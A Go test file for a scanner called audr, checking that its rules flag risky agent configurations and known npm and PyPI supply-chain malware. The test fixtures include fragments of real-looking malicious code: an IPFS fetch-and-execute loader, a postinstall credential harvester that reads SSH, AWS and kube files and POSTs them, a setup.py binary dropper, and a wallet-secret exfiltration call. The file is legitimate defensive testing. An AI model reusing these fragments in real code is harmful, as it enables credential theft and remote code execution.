package scan_test

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/harshmaur/audr/internal/output"
	_ "github.com/harshmaur/audr/internal/rules/builtin"
	"github.com/harshmaur/audr/internal/scan"
)

// TestScan_DirtyFixture asserts the scanner finds the expected categories
// of issues on the testdata/laptops/dirty fixture and does NOT leak any of
// the planted secrets in any of the three output formats.
func TestScan_DirtyFixture(t *testing.T) {
	root := repoRoot(t)
	fixture := filepath.Join(root, "testdata", "laptops", "dirty")

	res, err := scan.Run(context.Background(), scan.Options{
		Roots: []string{fixture},
	})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(res.Findings) == 0 {
		t.Fatalf("expected findings, got none")
	}

	expectedRules := []string{
		"mcp-unpinned-npx",
		"mcp-prod-secret-env",
		"mcp-plaintext-api-key",
		"mcp-shell-pipeline-command",
		"mcp-dynamic-config-injection",
		"skill-shell-hijack",
		"gha-write-all-permissions",
		"gha-secrets-in-agent-step",
	}
	got := map[string]int{}
	for _, f := range res.Findings {
		got[f.RuleID]++
	}
	for _, want := range expectedRules {
		if got[want] == 0 {
			t.Errorf("expected rule %q to fire on dirty fixture; rules fired: %v", want, got)
		}
	}

	// Planted secrets must NOT appear in any output format.
	plantedSecrets := []string{
		"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", // .mcp.json
		"hunter2", // postgres URL password
		"ghp_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",        // .zshrc
		"AKIAIOSFODNN7EXAMPLE",                                // .zshrc
		"sk-ant-api03-cccccccccccccccccccccccccccccccccccccc", // .zshrc
	}

	report := output.Report{
		Findings:    res.Findings,
		Roots:       []string{fixture},
		StartedAt:   res.StartedAt,
		FinishedAt:  res.FinishedAt,
		FilesSeen:   res.FilesSeen,
		FilesParsed: res.FilesParsed,
		Version:     "test",
	}

	for _, format := range []string{"html", "sarif", "json"} {
		var buf bytes.Buffer
		var err error
		switch format {
		case "html":
			err = output.HTML(&buf, report)
		case "sarif":
			err = output.SARIF(&buf, report)
		case "json":
			err = output.JSON(&buf, report)
		}
		if err != nil {
			t.Fatalf("%s format: %v", format, err)
		}
		out := buf.String()
		for _, secret := range plantedSecrets {
			if strings.Contains(out, secret) {
				t.Errorf("LEAK in %s output: planted secret %q appears in output", format, secret)
			}
		}
		// Spot-check the redaction marker survived the format. The "<" gets
		// encoded differently per format (HTML: &lt;, JSON: <, plain: <),
		// but the literal "redacted:" substring is invariant.
		if !strings.Contains(out, "redacted:") {
			t.Errorf("%s output missing redaction markers", format)
		}
	}
}

// TestScan_CleanFixture asserts the scanner emits zero findings on a clean
// laptop layout. A regression here is the worst kind: false positives drown
// the user in noise and kill the LinkedIn demo.
func TestScan_CleanFixture(t *testing.T) {
	root := repoRoot(t)
	fixture := filepath.Join(root, "testdata", "laptops", "clean")

	res, err := scan.Run(context.Background(), scan.Options{
		Roots: []string{fixture},
	})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(res.Findings) > 0 {
		for _, f := range res.Findings {
			t.Logf("unexpected finding: %s — %s at %s", f.RuleID, f.Title, f.Path)
		}
		t.Fatalf("clean fixture produced %d findings; want 0", len(res.Findings))
	}
}

// TestScan_MiniShaiHuludRouterInitUnderNodeModules asserts the default walker
// keeps node_modules skipped for performance, but still checks known Mini
// Shai-Hulud package-root payload filenames.
func TestScan_MiniShaiHuludRouterInitUnderNodeModules(t *testing.T) {
	root := t.TempDir()
	payload := filepath.Join(root, "node_modules", "@tanstack", "router-core", "router_init.js")
	if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(payload, []byte("/* obfuscated */"), 0o644); err != nil {
		t.Fatal(err)
	}
	ignored := filepath.Join(root, "node_modules", "@tanstack", "router-core", "dist", "router_init.js")
	if err := os.MkdirAll(filepath.Dir(ignored), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(ignored, []byte("/* nested ignored */"), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	got := 0
	for _, f := range res.Findings {
		if f.RuleID == "mini-shai-hulud-dropped-payload" {
			got++
		}
	}
	if got != 1 {
		t.Fatalf("mini-shai-hulud-dropped-payload findings = %d, want 1; findings=%+v", got, res.Findings)
	}
}

// TestScan_JscramblerPayloadUnderNodeModules asserts the default walker keeps
// node_modules skipped while still checking the campaign's exact package path.
func TestScan_JscramblerPayloadUnderNodeModules(t *testing.T) {
	root := t.TempDir()
	payload := filepath.Join(root, "node_modules", "jscrambler", "dist", "intro.js")
	if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(payload, []byte{0x1b, 0x43, 0x53, 0x49, 0x01}, 0o644); err != nil {
		t.Fatal(err)
	}

	lookalike := filepath.Join(root, "node_modules", "other", "dist", "intro.js")
	if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(lookalike, []byte{0x1b, 0x43, 0x53, 0x49, 0x01}, 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	got := 0
	for _, f := range res.Findings {
		if f.RuleID == "jscrambler-malicious-payload-ioc" {
			got++
		}
	}
	if got != 1 {
		t.Fatalf("jscrambler-malicious-payload-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
	}
}

// TestScan_NodemonSudoTslintConfBackdoorUnderNodeModules asserts the default
// walker stays bounded while checking this campaign's exact package-root IOC.
func TestScan_NodemonSudoTslintConfBackdoorUnderNodeModules(t *testing.T) {
	raw := []byte(`const src = 'https://peach-eligible-penguin-917.mypinata.cloud/ipfs/bafkreigjnxn5vnn34rc5r43ajwwkmk4akqpm4awmq5gdhakgszpeqiffsu';
const s = (await axios.get(src)).data.cookie;
const handler = new Function.constructor('require', s);
handler(require);`)
	layouts := []struct {
		name string
		rel  string
	}{
		{"hoisted", filepath.Join("node_modules", "tslint-conf", "lib", "caller.js")},
		{"nested-npm", filepath.Join("node_modules", "nodemon-sudo", "node_modules", "tslint-conf", "lib", "caller.js")},
		{"pnpm-store", filepath.Join("node_modules", ".pnpm", "tslint-conf@7.2.1", "node_modules", "tslint-conf", "lib", "caller.js")},
	}
	for _, layout := range layouts {
		t.Run(layout.name, func(t *testing.T) {
			root := t.TempDir()
			payload := filepath.Join(root, layout.rel)
			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(payload, raw, 0o644); err != nil {
				t.Fatal(err)
			}

			lookalike := filepath.Join(root, "node_modules", "other", "lib", "caller.js")
			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
				t.Fatal(err)
			}

			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			got := 0
			for _, f := range res.Findings {
				if f.RuleID == "nodemon-sudo-tslint-conf-backdoor-ioc" {
					got++
				}
			}
			if got != 1 {
				t.Fatalf("nodemon-sudo-tslint-conf-backdoor-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
			}
		})
	}
}

// TestScan_MarketfrontCredentialHarvesterUnderNodeModules asserts that the
// default walker stays bounded while checking the campaign's package-root
// postinstall payload in npm and pnpm layouts.
func TestScan_MarketfrontCredentialHarvesterUnderNodeModules(t *testing.T) {
	raw := []byte(`
const targets = ['.ssh', '.aws/credentials', '.kube/config', '.docker/config.json', '.npmrc'];
const body = gzipSync(Buffer.from(JSON.stringify(collected)));
https.request({method: 'POST', path: '/api/v1/events', headers: {'X-Secret': secret}});
`)
	layouts := []struct {
		name string
		rel  string
	}{
		{"hoisted", filepath.Join("node_modules", "@marketfront", "header", "scripts", "postinstall.js")},
		{"pnpm", filepath.Join("node_modules", ".pnpm", "@marketfront+header@7.0.0", "node_modules", "@marketfront", "header", "scripts", "postinstall.js")},
		{"tqm-mfe", filepath.Join("node_modules", "@tqm-mfe", "main", "scripts", "postinstall.js")},
	}
	for _, layout := range layouts {
		t.Run(layout.name, func(t *testing.T) {
			root := t.TempDir()
			payload := filepath.Join(root, layout.rel)
			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(payload, raw, 0o644); err != nil {
				t.Fatal(err)
			}

			lookalike := filepath.Join(root, "node_modules", "@other", "header", "scripts", "postinstall.js")
			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
				t.Fatal(err)
			}

			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			got := 0
			for _, f := range res.Findings {
				if f.RuleID == "marketfront-dependency-confusion-credential-harvester" {
					got++
				}
			}
			if got != 1 {
				t.Fatalf("marketfront findings = %d, want 1; findings=%+v", got, res.Findings)
			}
		})
	}
}

// TestScan_AsyncAPIMiasmaPayloadUnderNodeModules asserts that node_modules
// stays skipped except for exact AsyncAPI campaign paths carrying a known IOC.
func TestScan_AsyncAPIMiasmaPayloadUnderNodeModules(t *testing.T) {
	root := t.TempDir()
	payload := filepath.Join(root, "node_modules", "@asyncapi", "specs", "index.js")
	if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(payload, []byte(`const marker = "miasma-train-p1";`), 0o644); err != nil {
		t.Fatal(err)
	}
	lookalike := filepath.Join(root, "node_modules", "@other", "specs", "index.js")
	if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(lookalike, []byte(`const marker = "miasma-train-p1";`), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	got := 0
	for _, f := range res.Findings {
		if f.RuleID == "asyncapi-miasma-rat-ioc" {
			got++
		}
	}
	if got != 1 {
		t.Fatalf("asyncapi-miasma-rat-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
	}
}

// TestScan_XYQDramaSkillSetupSource proves the normal walker recognizes the
// campaign's setup.py source markers.
func TestScan_XYQDramaSkillSetupSource(t *testing.T) {
	root := t.TempDir()
	payload := filepath.Join(root, "setup.py")
	raw := []byte(`
HELPER_URL = "https://douyin-cloud.tos-cn-beijing.volces.com/obj/hosts/log-helper"
target = Path.home() / ".log-helper"
subprocess.Popen([str(target)], start_new_session=True)
`)
	if err := os.WriteFile(payload, raw, 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	got := 0
	for _, f := range res.Findings {
		if f.RuleID == "xyq-drama-skill-log-helper-ioc" {
			got++
		}
	}
	if got != 1 {
		t.Fatalf("xyq-drama-skill-log-helper-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
	}
}

// TestScan_Ada8877SentryPayloadUnderNodeModules proves the bounded
// node_modules exception reaches the campaign's exact verify.js package path.
func TestScan_Ada8877SentryPayloadUnderNodeModules(t *testing.T) {
	root := t.TempDir()
	payload := filepath.Join(root, "node_modules", "@edgecommons", "edgecommons", "examples", "verify.js")
	if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
		t.Fatal(err)
	}
	raw := []byte(`
const Sentry = require("@sentry/node");
Sentry.init({dsn: "https://example@o4510485815754752.ingest.us.sentry.io/4511632673275909", sendDefaultPii: true});
fetch("https://www.cloudflare.com/cdn-cgi/trace");
`)
	if err := os.WriteFile(payload, raw, 0o644); err != nil {
		t.Fatal(err)
	}
	lookalike := filepath.Join(root, "node_modules", "@other", "edgecommons", "examples", "verify.js")
	if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	got := 0
	for _, f := range res.Findings {
		if f.RuleID == "ada8877-sentry-dependency-confusion-ioc" {
			got++
		}
	}
	if got != 1 {
		t.Fatalf("ada8877-sentry-dependency-confusion-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
	}
}

// TestScan_InjectiveWalletStealerUnderNodeModules proves the bounded
// node_modules exception reaches the compromised generated bundle without
// broad-scanning unrelated package files.
func TestScan_InjectiveWalletStealerUnderNodeModules(t *testing.T) {
	raw := []byte(`
const endpoint = chars.map((x) => String.fromCharCode(x)).join("");
function trackKeyDerivation(method, value) { queue.push(method + ":" + value); }
fetch(endpoint, {method: "POST", headers: {
  "Content-Type": "application/grpc-web+proto",
  "X-Request-Id": encodedWalletSecret
}});
`)
	layouts := []struct {
		name string
		rel  string
	}{
		{"npm", filepath.Join("node_modules", "@injectivelabs", "sdk-ts", "dist", "esm", "accounts-jQ1GSgaW.js")},
		{"pnpm", filepath.Join("node_modules", ".pnpm", "@injectivelabs+sdk-ts@1.20.21", "node_modules", "@injectivelabs", "sdk-ts", "dist", "cjs", "accounts-Cy0p4lLW.cjs")},
	}
	for _, layout := range layouts {
		t.Run(layout.name, func(t *testing.T) {
			root := t.TempDir()
			payload := filepath.Join(root, layout.rel)
			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(payload, raw, 0o644); err != nil {
				t.Fatal(err)
			}
			lookalike := filepath.Join(root, "node_modules", "@other", "sdk-ts", "dist", "esm", "accounts-lookalike.js")
			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
				t.Fatal(err)
			}

			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			got := 0
			for _, f := range res.Findings {
				if f.RuleID == "injective-sdk-wallet-secret-exfil-ioc" {
					got++
				}
			}
			if got != 1 {
				t.Fatalf("injective wallet-stealer findings = %d, want 1; findings=%+v", got, res.Findings)
			}
		})
	}
}

// TestScan_TimeoutHonored asserts that ScanTimeout terminates a slow scan
// gracefully and still returns the partial result.
func TestScan_TimeoutHonored(t *testing.T) {
	root := repoRoot(t)
	fixture := filepath.Join(root, "testdata", "laptops", "dirty")
	// 1 nanosecond timeout: should bail out immediately.
	_, err := scan.Run(context.Background(), scan.Options{
		Roots:       []string{fixture},
		ScanTimeout: 1, // 1 nanosecond
	})
	// We don't assert err != nil because the scan is so small it may finish
	// before the deadline is checked. We DO assert it doesn't panic.
	_ = err
}

// TestScan_DefaultSkipDirsCoverWindowsCaches: the default skip list
// must include the Windows AppData cache basenames so a Windows
// $HOME scan doesn't tank on browser caches and UWP app trees.
// Anchored as a regression: each addition to defaultSkipDirs() is a
// deliberate choice and dropping any of these silently makes Windows
// scans 10x slower.
func TestScan_DefaultSkipDirsCoverWindowsCaches(t *testing.T) {
	tmp := t.TempDir()

	// Plant noise inside basenames we expect to be skipped. Each
	// directory contains a file with a name DetectFormat would
	// recognize (so a non-skipped walk would enqueue it). If the
	// skip works, the file is invisible to the scanner.
	cacheBasenames := []string{
		"INetCache",
		"WindowsApps",
		"NuGet",
		".nuget",
		"npm-cache",
		"go-build",
	}
	for _, base := range cacheBasenames {
		dir := filepath.Join(tmp, base)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		// .mcp.json is a recognized format; planting it here makes
		// the test fail if the skip didn't take.
		mcp := filepath.Join(dir, ".mcp.json")
		if err := os.WriteFile(mcp, []byte(`{"mcpServers":{"x":{"command":"npx"}}}`), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{tmp}})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	for _, f := range res.Findings {
		for _, base := range cacheBasenames {
			if strings.Contains(f.Path, string(os.PathSeparator)+base+string(os.PathSeparator)) {
				t.Errorf("finding from inside skipped dir %q: %s at %s",
					base, f.RuleID, f.Path)
			}
		}
	}
}

// TestScan_PkgBasenameNotSkipped: the symmetric regression. `pkg` is
// deliberately NOT in the skip list because it collides with the
// widespread Go layout convention (myproject/pkg/...). A finding
// under `tmp/pkg/.mcp.json` MUST surface.
func TestScan_PkgBasenameNotSkipped(t *testing.T) {
	tmp := t.TempDir()
	dir := filepath.Join(tmp, "pkg")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	mcp := filepath.Join(dir, ".mcp.json")
	// Use a config that fires unpinned-npx (a high-confidence rule)
	// so this test doesn't depend on the exact rule corpus.
	if err := os.WriteFile(mcp, []byte(`{"mcpServers":{"x":{"command":"npx","args":["@modelcontextprotocol/server-fs"]}}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{tmp}})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	saw := false
	for _, f := range res.Findings {
		if strings.HasSuffix(f.Path, filepath.Join("pkg", ".mcp.json")) {
			saw = true
			break
		}
	}
	if !saw {
		t.Errorf("pkg/.mcp.json should NOT be skipped (collides with Go layout)")
	}
}

// repoRoot returns the audr module root by walking up from the test's
// working directory until go.mod is found.
func repoRoot(t *testing.T) string {
	t.Helper()
	wd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	for dir := wd; dir != "/"; dir = filepath.Dir(dir) {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
	}
	t.Fatal("repo root not found")
	return ""
}
